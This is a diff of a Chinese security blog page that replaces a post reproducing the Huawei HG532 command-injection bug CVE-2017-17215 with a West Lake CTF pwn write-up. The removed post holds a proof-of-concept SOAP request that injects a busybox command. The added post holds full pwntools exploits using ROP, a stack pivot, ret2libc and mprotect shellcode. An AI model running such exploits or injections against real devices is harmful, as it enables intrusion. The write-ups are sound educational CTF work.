@@ -16,27 +16,24 @@
   <meta name="author" content="xtxtn">
   <meta name="keywords" content="">
   
-    <meta name="description" content="​																					 由于不想重新再开一个虚拟机，这里就直接使用IoT-vulhub这个项目来配置的环境。 CVE-2017-17215在项目中只能依赖于qemu-system启动，需要我们事先构建好相应qemu-system的docker镜像。华为 HG532路由器的固件是mips大端架构，所以先进入到&#x2F;baseImage&#x2F;qemu-system&#x2F;mips&#x2F;images下">
+    <meta name="description" content="第一次打西湖论剑，只做出了两道pwn题，那个jit到最后也没能看明白:cry:。 babycalc如下图，输入0x100大小的数据可以修改栈上i的值，通过i与v3的偏移就可以修改栈上的任意一字节，而且输入后存在off-by-one  ​				 这里利用i与v3的偏移修改返回值为 leave ret的地址，只能更改一字节，这里修改为0x400C18，利用off-by-one改变rbp的值来实现栈迁">
 <meta property="og:type" content="article">
-<meta property="og:title" content="简单复现CVE-2017-17215">
-<meta property="og:url" content="https://xtxtn.github.io/2023/01/01/CVE-2017-17215/index.html">
+<meta property="og:title" content="西湖论剑-pwn">
+<meta property="og:url" content="https://xtxtn.github.io/2023/02/07/xhlj-pwn/index.html">
 <meta property="og:site_name" content="xtxtn&#39;s Blog">
-<meta property="og:description" content="​																					 由于不想重新再开一个虚拟机，这里就直接使用IoT-vulhub这个项目来配置的环境。 CVE-2017-17215在项目中只能依赖于qemu-system启动，需要我们事先构建好相应qemu-system的docker镜像。华为 HG532路由器的固件是mips大端架构，所以先进入到&#x2F;baseImage&#x2F;qemu-system&#x2F;mips&#x2F;images下">
+<meta property="og:description" content="第一次打西湖论剑，只做出了两道pwn题，那个jit到最后也没能看明白:cry:。 babycalc如下图，输入0x100大小的数据可以修改栈上i的值，通过i与v3的偏移就可以修改栈上的任意一字节，而且输入后存在off-by-one  ​				 这里利用i与v3的偏移修改返回值为 leave ret的地址，只能更改一字节，这里修改为0x400C18，利用off-by-one改变rbp的值来实现栈迁">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://xtxtn.github.io/img/9/Screenshot_20230108_021304.png">
-<meta property="og:image" content="https://xtxtn.github.io/img/9/Screenshot_20230108_022129.png">
-<meta property="og:image" content="https://xtxtn.github.io/img/9/Screenshot_20230108_024054.png">
-<meta property="og:image" content="https://xtxtn.github.io/img/9/Screenshot_20230108_043234.jpg">
-<meta property="og:image" content="https://xtxtn.github.io/img/9/Screenshot_20230108_044959.png">
-<meta property="article:published_time" content="2022-12-31T17:25:26.557Z">
-<meta property="article:modified_time" content="2023-01-13T12:01:58.607Z">
+<meta property="og:image" content="https://xtxtn.github.io/img/11/Screenshot_20230208_111806.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/11/Screenshot_20230209_124709.jpg">
+<meta property="article:published_time" content="2023-02-07T05:11:29.337Z">
+<meta property="article:modified_time" content="2023-02-15T08:42:14.503Z">
 <meta property="article:author" content="xtxtn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://xtxtn.github.io/img/9/Screenshot_20230108_021304.png">
+<meta name="twitter:image" content="https://xtxtn.github.io/img/11/Screenshot_20230208_111806.png">
   
   
   
-  <title>简单复现CVE-2017-17215 - xtxtn&#39;s Blog</title>
+  <title>西湖论剑-pwn - xtxtn&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +210,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="简单复现CVE-2017-17215"></span>
+            <span id="subtitle" data-typed-text="西湖论剑-pwn"></span>
           
         </div>
 
@@ -224,8 +221,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-01-01 01:25" pubdate>
-          2023年1月1日 凌晨
+        <time datetime="2023-02-07 13:11" pubdate>
+          2023年2月7日 下午
         </time>
       </span>
     
@@ -236,7 +233,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          3.1k 字
         
       </span>
     
@@ -247,7 +244,7 @@
         
         
         
-          16 分钟
+          26 分钟
         
       </span>
     
@@ -285,43 +282,31 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">简单复现CVE-2017-17215</h1>
+            <h1 style="display: none">西湖论剑-pwn</h1>
             
             
               <div class="markdown-body">
                 
-                <p>​																					</p>
-<p>由于不想重新再开一个虚拟机，这里就直接使用<a target="_blank" rel="noopener" href="https://github.com/VulnTotal-Team/IoT-vulhub">IoT-vulhub</a>这个项目来配置的环境。</p>
-<p>CVE-2017-17215在项目中只能依赖于qemu-system启动，需要我们事先构建好相应qemu-system的docker镜像。华为 HG532路由器的固件是mips大端架构，所以先进入到<code>/baseImage/qemu-system/mips/images</code>下载好相应的qemu启动镜像，再去构建<code>qemu-system:mips</code>的docker镜像</p>
-<img src="/img/9/Screenshot_20230108_021304.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+                <p>第一次打西湖论剑，只做出了两道pwn题，那个jit到最后也没能看明白:cry:。</p>
+<h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p>如下图，输入0x100大小的数据可以修改栈上<code>i</code>的值，通过<code>i</code>与v3的偏移就可以修改栈上的任意一字节，而且输入后存在off-by-one</p>
+<p><img src="/img/11/Screenshot_20230208_111806.png" srcset="/img/loading.gif" lazyload></p>
+<p>​				</p>
+<p>这里利用<code>i</code>与v3的偏移修改返回值为 <code>leave ret</code>的地址，只能更改一字节，这里修改为0x400C18，利用off-by-one改变rbp的值来实现栈迁移，具体效果如下：</p>
+<img src="/img/11/Screenshot_20230209_124709.jpg" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
 
-<p>最后按照项目的<a target="_blank" rel="noopener" href="https://github.com/VulnTotal-Team/IoT-vulhub/tree/master/HUAWEI/CVE-2017-17215">教程</a>来就可以正常运行启动环境了。</p>
-<p>​							</p>
-<p>这里是在docker中再去运行qemu-system，qemu-system中的ip在本机上是无法直接访问的，在使用ssh通过2345端口转发后，如果想使用本机的浏览器去访问路由登录界面也需要设置相应的代理</p>
-<img src="/img/9/Screenshot_20230108_022129.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" />
+<p>​						</p>
+<p>由于栈每次启动的地址不同，还需要爆破栈地址，再ret2libc。</p>
+<p>完整exp</p>
+<p>远程libc为2.23-0ubuntu11.3_amd64</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babycalc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    pop_rdi = <span class="hljs-number">0x400ca3</span><br>    ret = pop_rdi + <span class="hljs-number">1</span><br>    rop1 = p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(ret) * <span class="hljs-number">0x10</span> +  p64(<span class="hljs-number">0x400650</span>) <span class="hljs-comment">#</span><br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop1<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>    rop2 = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop2<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">26087</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure>
 
-<p>使用firefox直接去访问<code>http://192.168.2.2/</code>可能报错，需要在<code>about:config</code>中去更改security.tls.version.fallback-limit和security.tls.version.min</p>
-<img src="/img/9/Screenshot_20230108_024054.png" srcset="/img/loading.gif" lazyload  />
 
-<p>更改后就可以正常访问<code>http://192.168.2.2/</code>路由登录界面了</p>
-<p>​									</p>
-<p>poc如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>headers = &#123;<br>    <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br>&#125;<br> <br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-string"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="hljs-string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="hljs-string">   &lt;NewStatusURL&gt;;/bin/busybox ls;&lt;/NewStatusURL&gt;</span><br><span class="hljs-string">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="hljs-string">  &lt;/u:Upgrade&gt;</span><br><span class="hljs-string"> &lt;/s:Body&gt;</span><br><span class="hljs-string">&lt;/s:Envelope&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>response = requests.post(<span class="hljs-string">&#x27;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&#x27;</span>,headers=headers,data=data)						<br></code></pre></td></tr></table></figure>
 
-<p>​							</p>
-<p>运行如下：</p>
-<img src="/img/9/Screenshot_20230108_043234.jpg" srcset="/img/loading.gif" lazyload  />
+<h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><p>格式化字符串泄漏<code>__libc_start_main</code>函数地址，利用栈迁移到bss段继续执行ROP，使用mprotect函数更改bss的执行权限，最后执行shellcode。</p>
+<p>​								</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">22429</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span> <br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>libc = elf.libc<br><br>bss = <span class="hljs-number">0x4040b0</span><br>pop_rdi = <span class="hljs-number">0x401413</span><br>leave_ret = <span class="hljs-number">0x4012e1</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Welcome to DASCTF message board, please leave your name:&#x27;</span>,<span class="hljs-string">b&#x27;%31$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span> + p64(bss + <span class="hljs-number">0xb0</span>) + p64(<span class="hljs-number">0x40136C</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(bss - <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">7</span>),<br>    p64(mprotect),<br>    p64(bss + <span class="hljs-number">0x40</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload = payload.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(bss -<span class="hljs-number">8</span>) + p64(leave_ret)<br>p.sendafter(<span class="hljs-string">&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<p>在此过程中，可以进入docker中使用tcdump去抓取流量，然后复制到本机中用Wireshark具体分析：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">tcpdump -i tap0 -w result.cap<br><br>docker cp <span class="hljs-number">74</span>d6970b35fb:<span class="hljs-regexp">/root/</span>result.cap <span class="hljs-regexp">/home/</span>kali/Desktop<br></code></pre></td></tr></table></figure>
-
-<p>​			</p>
-<p>这个命令注入的实现是在&#x2F;bin&#x2F;upnp这个文件中的sub_40749c函数引发的，通过对NewStatusURL和NewDownloadURL字符串的交叉引用，很容易在binaryninja发现该函数</p>
-<p><img src="/img/9/Screenshot_20230108_044959.png" srcset="/img/loading.gif" lazyload></p>
-<p>​							</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article?id=187#%E8%AE%BE%E5%A4%87%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90">华为HG532 - CVE-2017-17215漏洞简析- IOTsec-Zone物联网安全社区</a></p>
-<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274713.htm">原创]华为HG532路由器命令注入漏洞分析(CVE-2017-17215)-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
 
                 
               </div>
@@ -339,8 +324,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>简单复现CVE-2017-17215</div>
-      <div>https://xtxtn.github.io/2023/01/01/CVE-2017-17215/</div>
+      <div>西湖论剑-pwn</div>
+      <div>https://xtxtn.github.io/2023/02/07/xhlj-pwn/</div>
     </div>
     <div class="license-meta">
       
@@ -352,7 +337,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年1月1日</div>
+          <div>2023年2月7日</div>
         </div>
       
       
@@ -396,18 +381,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/01/07/buu2/" title="buu寒假练习2">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">buu寒假练习2</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/30/buu1/" title="buu寒假练习1">
-                        <span class="hidden-mobile">buu寒假练习1</span>
+                      <a href="/2023/02/07/hgame-week4-pwn/" title="hgame-week4-pwn">
+                        <span class="hidden-mobile">hgame-week4-pwn</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
